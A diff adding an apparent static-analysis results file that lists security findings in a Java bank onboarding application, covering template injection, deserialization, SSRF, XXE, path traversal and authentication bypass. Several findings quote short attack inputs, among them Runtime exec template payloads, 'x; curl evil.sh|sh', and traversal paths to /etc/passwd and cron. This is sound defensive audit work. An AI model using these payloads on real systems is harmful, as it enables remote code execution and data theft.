@@ -1,0 +1,662 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "java.security.injection.velocity-ssti-admin-notification-preview",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/AdminController.java",
+      "start": {
+        "line": 151,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 151,
+        "col": 75,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `source` request parameter (fully attacker/admin-controlled Velocity template text) is passed directly into `Velocity.evaluate(context, writer, \"notification-preview\", source)`. Velocity templates can invoke arbitrary Java methods via its uberspection/`$class` reflection tricks (e.g. `#set($e=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))`), giving full server-side template injection leading to remote code execution for anyone able to reach this bank_admin endpoint.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.spel-expression-injection-admin-policy",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/AdminController.java",
+      "start": {
+        "line": 167,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 167,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `formula` request parameter is compiled and evaluated with `SpelExpressionParser` using a `StandardEvaluationContext` (not a restricted `SimpleEvaluationContext`). SpEL's StandardEvaluationContext permits arbitrary type/method invocation (e.g. `T(java.lang.Runtime).getRuntime().exec('...')`), so a caller supplying a malicious formula string achieves remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.os-command-injection-document-renderpack",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/service/DocumentService.java",
+      "start": {
+        "line": 207,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 208,
+        "col": 72,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`templateName` (from `PackRenderRequest.templateName()`, fully client-controlled via POST /api/applications/{appId}/documents/pack) is concatenated directly into a shell command string executed via `ProcessBuilder(\"sh\",\"-c\", ...)`. A value such as `x; curl evil.sh|sh` or using `$(...)`/backticks lets any onboarding_officer run arbitrary OS commands on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.authn-bypass.forgeable-console-session-cookie",
+      "path": "web/src/main/java/sg/bank/web/web/ServicingDeskController.java",
+      "start": {
+        "line": 19,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 29,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "GET /servicing/desk is listed under `permitAll` in WebSecurityConfig (`/servicing/**`), yet it mints the `servicing_ctx` cookie directly from the client-supplied `X-Desk-Officer`/`X-Desk-Role` HTTP headers with zero authentication, signature, or MAC. `ConsoleSessionFilter` (web/src/main/java/sg/bank/web/config/ConsoleSessionFilter.java:38-46) later decodes this unsigned Base64 cookie and installs a fully authenticated `SecurityContextHolder` principal with `ROLE_<attacker-chosen-role>` (e.g. `bank_admin`) and an arbitrary `userId`, bypassing the login flow entirely. Any unauthenticated client can set `X-Desk-Role: bank_admin` and obtain a cookie that grants access to role-gated web routes such as `/admin/**` and `/compliance/**`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-290: Authentication Bypass by Spoofing"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.deserialization.insecure-objectinputstream-recall-queue",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/OfficerController.java",
+      "start": {
+        "line": 206,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 209,
+        "col": 57,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `plan` request parameter is Base64-decoded and fed straight into `ObjectInputStream.readObject()` with no type filtering or allow-list (`ObjectInputFilter`). Any onboarding_officer/compliance_officer caller can submit a crafted serialized Java gadget chain payload to achieve remote code execution on deserialization.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.deserialization.insecure-objectinputstream-sealed-envelope-state",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/SealedEnvelopeController.java",
+      "start": {
+        "line": 46,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 57,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`GET /api/kyc/state/{handoff}` Base64-URL-decodes the `handoff` path variable and deserializes it with `ObjectInputStream.readObject()` without any filter. Unlike other endpoints here there is not even a role check on `user` - any authenticated caller can submit an arbitrary serialized payload, achieving remote code execution via a Java deserialization gadget chain.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.deserialization.xstream-unrestricted-partner-profile",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/service/PartnerProfileXmlService.java",
+      "start": {
+        "line": 16,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 42,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`new XStream()` is used with none of XStream's security-framework permissions configured (no `setupDefaultSecurity`/`addPermission` allow-list). XStream 1.4.7 (declared in onboarding-api/build.gradle.kts:28) does not block arbitrary class instantiation by default unless the security framework is explicitly wired up, so `xs.fromXML(xml)` on the attacker-supplied `xml` body (POST /api/partner/profile) is vulnerable to known XStream gadget-chain deserialization RCE (cf. CVE-2013-7285 class of issues).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.xpath-injection-identity-archive-search",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/ComplianceController.java",
+      "start": {
+        "line": 173,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 173,
+        "col": 80,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`outcome` from the request body (`POST /api/compliance/identity-archive/search`) is concatenated directly into an XPath expression string (`//IdentityVerification[Outcome='\" + outcome + \"']`) evaluated by `XPathFactory`. An attacker-controlled value such as `x' or '1'='1` changes the query logic; the typical XPath-injection pattern also allows boolean-based data exfiltration from the parsed XML.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.freemarker-ssti-campaign-notice",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/ComplianceController.java",
+      "start": {
+        "line": 159,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 159,
+        "col": 62,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `wording` path variable (`GET /api/compliance/rekyc/campaigns/{id}/notice/{wording}`) is used directly as the raw FreeMarker template source: `new Template(\"campaign-notice\", wording, cfg)`. FreeMarker templates can call arbitrary static Java methods and execute system commands (e.g. via `<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}`), so any compliance_officer-reachable caller can achieve remote code execution through this endpoint.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.access-control.mass-assignment-profile-role-escalation",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/CustomerController.java",
+      "start": {
+        "line": 72,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 78,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`ProfileDetailsForm` (onboarding-api/src/main/java/sg/bank/onboarding/dto/Dtos.java:60-74) exposes a public `role` setter and an `emailVerified` setter despite the class javadoc's claim that `role` is never bindable. `saveProfileDetails` applies the client-supplied form straight onto the managed `AppUser` entity with `BeanUtils.copyProperties(form, actingUser)` and saves it. Any authenticated customer can POST `{\"email\":\"...\",\"mobile\":\"...\",\"role\":\"bank_admin\",\"emailVerified\":true}` to `/api/customer/profile-details` and self-promote to any role (bank_admin, compliance_officer, onboarding_officer) and mark their own email/mobile as verified, bypassing OTP verification.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.statement-archive-cookie-filename",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/CustomerController.java",
+      "start": {
+        "line": 127,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 139,
+        "col": 20,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `statementName` cookie value is used, unsanitized, as the file name in `new File(stmtDir.toFile(), stmtName)` then written to with `FileOutputStream`. A cookie value such as `../../../../etc/cron.d/evil` (or any path containing `..`) escapes the configured statement directory, giving any customer an arbitrary-file-write primitive on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.document-inspect-storage-name",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/service/DocumentStorageService.java",
+      "start": {
+        "line": 67,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 74,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`describe(String ref)` resolves the caller-supplied `storageName` (from `DocumentMetaRequest.storageName()`, POST /api/applications/{appId}/documents/inspect) with plain `baseDir.resolve(ref)` and reads file attributes from it - unlike the sibling `resolveForRead` method in this same class, it performs NO canonicalization or boundary check. A branch officer can supply `../../../../etc/passwd` (or any absolute/traversal path) to probe arbitrary filesystem paths (size, mtime, is-directory) outside the document storage root.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.ssrf.evidence-src-attach-fetch",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/service/DocumentService.java",
+      "start": {
+        "line": 110,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 115,
+        "col": 9,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`attachFromSrc` only checks that `srcUrl` starts with `http://` or `https://` before calling `restTemplate.getForEntity(srcUrl, byte[].class)`. There is no allow-list of hosts, so a branch officer can supply a URL pointing at internal-only services (e.g. `http://169.254.169.254/latest/meta-data/`, `http://core-mock:8082/...`, or any other internal host/port) and have the onboarding-api server fetch it on their behalf, enabling SSRF against the internal network.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.ssrf.rekyc-partner-notice-endpoint-url",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/service/RekycService.java",
+      "start": {
+        "line": 101,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 122,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`deliverCampaignNotice` POSTs attacker-controlled campaign data to `endpointUrl` (from `PartnerNoticeRequest.endpointUrl()`, no scheme or host validation at all) via `RestTemplate.postForEntity`. A compliance officer can point this at any internal host/port, letting the server perform SSRF requests (with campaign name/segment data) against internal infrastructure.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.ldap-injection-directory-sync",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/service/StaffDirectoryService.java",
+      "start": {
+        "line": 74,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 75,
+        "col": 61,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`directoryUnit` is taken from the client-supplied `directoryUnit` cookie (AdminController.java:131-136, `syncDirectory`) and concatenated unescaped into an LDAP search filter: `\"(&(objectClass=person)(uid=\" + directoryUnit + \"))\"`. A cookie value containing LDAP filter metacharacters (e.g. `*)(uid=*))(|(uid=*`) lets an attacker broaden or alter the search filter, enabling LDAP injection against the corporate directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.access-control.unverified-jwt-partner-assertion",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/OfficerController.java",
+      "start": {
+        "line": 225,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 227,
+        "col": 53,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`io.jsonwebtoken.Jwts.parser().build().parseClaimsJwt(assertion)` parses the `X-Partner-Assertion` header as an UNSECURED JWT - `parseClaimsJwt` (as opposed to `parseClaimsJws`) accepts only unsigned tokens and performs no signature verification at all. The `branchId` used to scope the returned application queue is read straight from this unverified, attacker-forgeable claim, so any caller can construct `{\"sub\":\"<any-branch-id>\"}` base64 segments (no key needed) to read any other branch's application queue.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-863: Incorrect Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.xxe.identity-provider-response-parse",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/service/ProviderClient.java",
+      "start": {
+        "line": 88,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 90,
+        "col": 84,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`parseIdentityResponse` builds a `DocumentBuilderFactory` with default settings (DOCTYPE declarations and external entity resolution left enabled) and parses the identity-verification provider's XML response. Unlike the deliberately hardened parser in `ReferenceDataImportService`, this `DocumentBuilderFactory` disables neither DTDs nor external general/parameter entities, so a response (or anything reaching this parse path) containing a DOCTYPE with an external entity can read local files or trigger SSRF/billion-laughs style denial of service.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.xxe.identity-archive-reparse",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/ComplianceController.java",
+      "start": {
+        "line": 177,
+        "col": 17,
+        "offset": 0
+      },
+      "end": {
+        "line": 179,
+        "col": 83,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`searchArchive` re-parses each stored `identity_verification.raw_xml` record with a default (non-hardened) `DocumentBuilderFactory`, the same unhardened configuration pattern as ProviderClient. Any stored raw XML reaching this code path is parsed with DTDs/external entities enabled, a second XXE-capable sink over data that ultimately originates from the identity-verification round trip.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.xss.reflected-enquiry-note",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/ApplicantController.java",
+      "start": {
+        "line": 149,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 151,
+        "col": 95,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `note` request parameter is concatenated directly into an HTML response body (`text/html` content type) with no encoding: `\"<p>\" + note + \"</p>\"`. A value like `<script>...</script>` is reflected verbatim and executes in the context of whoever views the rendered response, a classic reflected XSS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.weak-crypto.md5-phone-passphrase-verifier",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/AuthController.java",
+      "start": {
+        "line": 130,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 132,
+        "col": 10,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The telephone-banking passphrase verifier is a raw MD5 digest (`DigestUtils.md5DigestAsHex`), compared with `.equals()` (not constant-time) against the stored value. MD5 is fast to brute-force/crack offline and the comparison is not constant-time, unlike every other credential check in this codebase (BCrypt + MessageDigest.isEqual elsewhere). See also the enrollment sink at CustomerController.java:162-163.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.exposure.credentials-in-admin-integration-settings",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/web/AdminController.java",
+      "start": {
+        "line": 97,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 106,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`/api/admin/integration-settings` returns the raw downstream credentials (`coreApiKey`, `providerCredential`) in the plain JSON response body, rather than a redacted/masked value. Any bank_admin principal (or anyone who can reach this endpoint through a lower-privilege bug elsewhere) receives the live core-mock API key and provider-mock password in cleartext.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.exposure.password-hash-via-entity-serialization",
+      "path": "onboarding-api/src/main/java/sg/bank/onboarding/domain/AppUser.java",
+      "start": {
+        "line": 18,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 35,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`passwordHash` (and `phoneVerifier`) has no `@JsonIgnore`. Because `JacksonConfig` registers `Hibernate6Module` with `FORCE_LAZY_LOADING` enabled and `open-in-view: true` is set, every lazy `AppUser` association reachable from a serialized entity gets fully loaded and serialized. This leaks the BCrypt password hash whenever an `Application` or `StaffProfile` entity is returned directly from a controller, e.g. `AdminController.staff()` (StaffProfile.user -> AppUser), and `OfficerController.approve/decline` and `ComplianceController.overrideTier` (which return `app` directly, exposing `Application.applicantUser`/`assignedOfficer` -> AppUser.passwordHash) to onboarding_officer/compliance_officer/bank_admin callers.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-522: Insufficiently Protected Credentials",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.cors.reflected-origin-with-credentials",
+      "path": "web/src/main/java/sg/bank/web/web/ConsoleCrossOriginFilter.java",
+      "start": {
+        "line": 25,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 29,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "This filter reflects whatever `Origin` header the caller sends back as `Access-Control-Allow-Origin`, combined with `Access-Control-Allow-Credentials: true`. This allows ANY website to make authenticated, cookie-carrying cross-origin requests to the console and read the JSON/HTML response, defeating the same-origin policy for every session-cookie-authenticated endpoint in the web tier.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.csrf.disabled-for-journey-endpoints",
+      "path": "web/src/main/java/sg/bank/web/config/WebSecurityConfig.java",
+      "start": {
+        "line": 48,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 61,
+        "offset": 0
+      },
+      "extra": {
+        "message": "CSRF protection is disabled for the entire `/journey/**` path, which includes state-changing POST endpoints (`/journey/submit`, `/journey/employment`, `/journey/address`, `/journey/personal-details`, `/journey/otp/*`). A malicious cross-site page can auto-submit a form to these endpoints using the victim's authenticated session cookie with no CSRF token required, letting an attacker submit or tamper with a victim's in-progress onboarding application.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-352: Cross-Site Request Forgery (CSRF)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.misconfig.actuator-fully-exposed",
+      "path": "onboarding-api/src/main/resources/application.yml",
+      "start": {
+        "line": 57,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 64,
+        "col": 20,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The management server is bound to `0.0.0.0:8099` with `management.endpoints.web.exposure.include: \"*\"`, exposing every actuator endpoint (`/env`, `/heapdump`, `/shutdown`, `/beans`, etc.) on a separate port that is not covered by the application's `SecurityFilterChain` (which only permits `/actuator/health` on the main port). Anyone who can reach port 8099 can dump environment variables/secrets, trigger a heap dump of in-memory data, or shut the service down.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-16: Configuration",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.cookie.insecure-session-cookie-flags",
+      "path": "web/src/main/resources/application.yml",
+      "start": {
+        "line": 4,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 16,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The web tier's session cookie is configured with `http-only: false` and `secure: false`. `HttpOnly: false` lets any XSS on the site (e.g. the reflected XSS at ApplicantController.java:151) steal the session cookie via JavaScript, and `secure: false` lets the cookie be sent (and captured) over plaintext HTTP.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
